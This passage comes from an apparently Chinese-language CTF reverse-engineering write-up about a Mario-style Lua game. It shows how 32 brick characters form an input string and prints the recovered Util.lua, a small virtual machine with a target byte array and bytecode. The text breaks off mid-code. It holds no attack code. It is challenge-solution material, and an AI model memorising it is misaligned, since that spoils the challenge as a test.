NORMAL 状态（初始状态为 SMALL）。在 <em>collisionV</em> 函数中可以找到修改主角 bodyType 属性的调用：</p><p><img src="/img/article/20230402/change_body_type.png" alt="change_body_type"></p><p>不过需要主角吃到蘑菇才能被调用。在 <code>GameMap.lua</code> 中，可以找到 <em>isMarioEatMushroom</em> 的定义，其紧挨着的上一个函数是 <em>showNewMushroom</em>，看名字应该是用于生成蘑菇的。查找一下 <em>showNewMushroom</em> 的引用，可以发现它在 <em>breakBrick</em> 中被调用：</p><p><img src="/img/article/20230402/check_trigger.png" alt="check_trigger"></p><p>上图中框起来的部分就是触发输入校验的逻辑，它将所有普通方块上的字符拼接成长度为 32 的字符串，存放在变量 <strong>slot5</strong> 中。这里反编译结果存在一些偏差，应该是下面这样才对：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">slot5 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> slot9 = <span class="number">0</span>, <span class="number">31</span> <span class="keyword">do</span></span><br><span class="line">    slot5 = slot5 .. slot0.labelList[<span class="string">&quot;input&quot;</span> .. <span class="built_in">tostring</span>(slot9)]:getString()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>不过我们大致能猜到它的意思，拼接好后传递给 <code>Util.lua</code> 文件的 <em>create</em> 函数，得到一个 Util 模块实例 <strong>slot6</strong>。接着调用 <em>OoO</em> 函数和 <em>oOo</em> 函数，如果后者返回 true，则显示蘑菇。</p><p>所以问题简化成了如何令 <em>Util.oOo</em> 返回 true，这要求我们着重分析 <code>Util.lua</code> 文件。从现在开始，这道题就变成一道常规逆向题，还是给了源码的那种，稍微还原一下符号就能发现它是一个小型虚拟机。这里需要注意，除了 <em>create</em> 函数外，其他函数的第一个参数（slot0）都相当于 self，你可以简单理解为类静态函数和类成员函数的区别。</p><p>这里就不过多地去分析虚拟机的实现了，下面将 <code>Util.lua</code> 的源码奉上：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> Util=class(<span class="string">&quot;Util&quot;</span>,<span class="function"><span class="keyword">function</span> <span class="params">()</span></span></span><br><span class="line">    <span class="keyword">return</span> cc.Node:<span class="built_in">create</span>()</span><br><span class="line"><span class="keyword">end</span>)</span><br><span class="line"></span><br><span class="line">Util.slot = &#123;&#123;&#125;, &#123;&#125;, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util:ctor</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util.create</span><span class="params">(input)</span></span></span><br><span class="line">    <span class="keyword">local</span> util=Util.new()</span><br><span class="line">    <span class="keyword">local</span> target=&#123; <span class="number">94</span>, <span class="number">106</span>, <span class="number">91</span>, <span class="number">110</span>, <span class="number">86</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">20</span>, <span class="number">80</span>, <span class="number">21</span>, <span class="number">83</span>, <span class="number">107</span>, <span class="number">88</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">19</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">61</span>, <span class="number">13</span>, <span class="number">75</span>, <span class="number">115</span>, <span class="number">48</span>, <span class="number">8</span>, <span class="number">76</span>, <span class="number">123</span> &#125;</span><br><span class="line">    util.slot[<span class="number">1</span>]=&#123; <span class="number">65</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">191</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">50</span>, <span class="number">192</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">50</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">194</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">50</span>, <span class="number">195</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">6</span>, <span class="number">50</span>, <span class="number">197</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">198</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">8</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">8</span>, <span class="number">50</span>, <span class="number">199</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">9</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">9</span>, <span class="number">50</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">10</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">201</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">11</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">50</span>, <span class="number">202</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">203</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">13</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">13</span>, <span class="number">50</span>, <span class="number">204</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">14</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">205</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">15</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">206</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">207</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">208</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">19</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">50</span>, <span class="number">210</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">211</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">212</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">213</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">23</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">23</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">215</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">216</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">26</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">50</span>, <span class="number">217</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">27</span>, <span class="number">50</span>, <span class="number">218</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">28</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">50</span>, <span class="number">219</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">220</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">221</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">34</span>, <span class="number">10</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span> &#125;</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">256</span> <span class="keyword">do</span></span><br><span class="line">        util.slot[<span class="number">2</span>][i]=<span class="number">0</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">33</span>,<span class="number">65</span> <span class="keyword">do</span></span><br><span class="line">        util.slot[<span class="number">2</span>][i]=<span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="built_in">input</span>, i<span class="number">-32</span>)</span><br><span class="line">        util.slot[<span class="number">2</span>][i+<span class="number">96</span>]=target[i<span class="number">-32</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    util.slot[<span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">    util.slot[<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line">    util.slot[<span class="number">5</span>] = <span class="number">1</span></span><br><span class="line">    util.slot[<span class="number">6</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> util</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Util:OoO</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        opcode=<span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]]</span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x11</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> inputi = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="number">33</span>+operand]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="number">33</span>+operand] = <span class="built_in">self</span>:lil(inputi + <span class="number">1</span>, <span class="number">0xFF</span>)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x21</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[operand<span class="number">-7</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[operand<span class="number">-7</span>] = <span class="built_in">self</span>:lil(regi + <span class="number">1</span>, <span class="number">0xFF</span>)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x41</span> <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">6</span>] = <span class="built_in">self</span>.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[<span class="number">6</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">2</span>][regi] = operand</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x12</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> inputi = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="number">33</span>+operand]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="number">33</span>+operand] = <span class="built_in">self</span>:lil(inputi - <span class="number">1</span>, <span class="number">0xFF</span>)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x23</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand1 = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> operand2 = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[operand1<span class="number">-7</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">self</span>.slot[operand1<span class="number">-7</span>] = <span class="built_in">self</span>:ili(regi,operand2)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x32</span> <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">6</span>] = <span class="built_in">self</span>.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[<span class="number">6</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">2</span>][regi] = <span class="built_in">self</span>.slot[<span class="number">2</span>][<span class="number">33</span>+operand]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x24</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand1 = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> operand2 = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">local</span> reg1 = <span class="built_in">self</span>.slot[operand1<span class="number">-7</span>]</span><br><span class="line">            <span class="keyword">local</span> reg2 = <span class="built_in">self</span>.slot[operand2<span class="number">-7</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">self</span>.slot[operand1<span class="number">-7</span>] = <span class="built_in">self</span>:ili(reg1,reg2)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x31</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[<span class="number">6</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">2</span>][<span class="number">224</span>+operand] = <span class="built_in">self</span>.slot[<span class="number">2</span>][regi]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">6</span>] = <span class="built_in">self</span>.slot[<span class="number">6</span>] - <span class="number">1</span></span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x22</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[operand<span class="number">-7</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[operand<span class="number">-7</span>] = <span class="built_in">self</span>:lil(regi - <span class="number">1</span>, <span class="number">0xFF</span>)</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x42</span> <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">6</span>] = <span class="built_in">self</span>.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[<span class="number">6</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">2</span>][regi] = <span class="built_in">self</span>.slot[operand<span class="number">-7</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[<span class="number">5</span>] = <span class="built_in">self</span>.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elseif</span> opcode==<span class="number">0x25</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> operand = <span class="built_in">self</span>.slot[<span class="number">1</span>][<span class="built_in">self</span>.slot[<span class="number">5</span>]+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">local</span> regi = <span class="built_in">self</span>.slot[<span class="number">6</span>]</span><br><span class="line">            <span class="built_in">self</span>.slot[operand<span class="number">-7</span>] = <span class="built_in">self</span>.slot[<span class="number">2</span>][regi]</span><br><span class="line">            <span 